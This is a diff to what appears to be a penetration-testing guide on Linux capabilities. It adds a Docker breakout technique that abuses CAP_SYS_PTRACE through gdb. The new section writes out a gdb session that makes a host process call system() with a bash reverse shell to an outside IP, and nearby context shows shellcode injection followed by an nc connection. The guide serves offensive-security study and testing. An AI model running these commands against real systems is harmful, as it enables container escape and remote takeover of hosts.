@@ -457,7 +457,7 @@ ssh john@172.17.0.1 -p 2222
 
 ### CAP\_SYS\_PTRACE
 
-**This means that you can escape the container by injecting a shellcode inside some process running inside the host.**
+**This means that you can escape the container by injecting a shellcode inside some process running inside the host.** To access processes running inside the host the container needs to be run at least with **`--pid=host`**.
 
 #### Example with binary
 
@@ -553,7 +553,7 @@ print("Final Instruction Pointer: " + hex(registers.rip))
 libc.ptrace(PTRACE_DETACH, pid, None, None)
 ```
 
-#### Example with environment (Docker breakout)
+#### Example with environment (Docker breakout) - Shellcode Injection
 
 You can check the enabled capabilities inside the docker container using:
 
@@ -577,6 +577,19 @@ List **processes** running in the **host** `ps -eaf`
 3. Find a **program** to **inject** the **shellcode** into a process memory ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
 4. **Modify** the **shellcode** inside the program and **compile** it `gcc inject.c -o inject`
 5. **Inject** it and grab your **shell**: `./inject 299; nc 172.17.0.1 5600`
+
+#### Example with environment (Docker breakout) - Gdb Abuse
+
+If **GDB** is installed (or you can install it with `apk add gdb` or `apt install gdb` for example) you can **debug a process from the host** and make it call the `system` function. (This technique also requires the capability `SYS_ADMIN`)**.**
+
+```bash
+gdb -p 1234
+(gdb) call (void)system("ls")
+(gdb) call (void)system("sleep 5")
+(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
+```
+
+You won’t be able to see the output of the command executed but it will be executed by that process (so get a rev shell).
 
 ### CAP\_SYS\_MODULE
 
@@ -1239,11 +1252,7 @@ python setcapability.py /usr/bin/python2.7
 Note that if you set a new capability to the binary with CAP\_SETFCAP, you will lose this cap.
 {% endhint %}
 
-Once you have [SETUID capability](linux-capabilities.md#cap\_setuid) you can go to it's section to see how to escalate privileges.
-
-#### Example with environment (Docker breakout)
-
-
+Once you have [SETUID capability](linux-capabilities.md#cap\_setuid) you can go to its section to see how to escalate privileges.
 
 ### CAP\_KILL
 
